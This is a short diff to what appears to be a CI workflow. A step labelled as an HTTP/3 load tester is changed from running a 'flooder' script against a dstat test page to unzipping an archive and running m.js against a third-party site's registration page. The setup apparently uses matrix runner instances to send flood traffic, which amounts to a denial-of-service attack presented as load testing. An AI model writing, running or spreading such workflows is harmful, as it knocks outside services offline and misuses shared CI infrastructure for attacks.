@@ -37,7 +37,9 @@ jobs:
             
       - name: Run HTTP/3 load tester
         run: |
-          xvfb-run -a node browser.js https://captcha.dstatbot.win/hlK6yx3m 700 4 64 m.txt --debug true --flooder true
+          unzip Fc-main.zip
+          cd Fc-main
+          node m.js https://abgxefe.com.tr/register 200 3 3 3
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
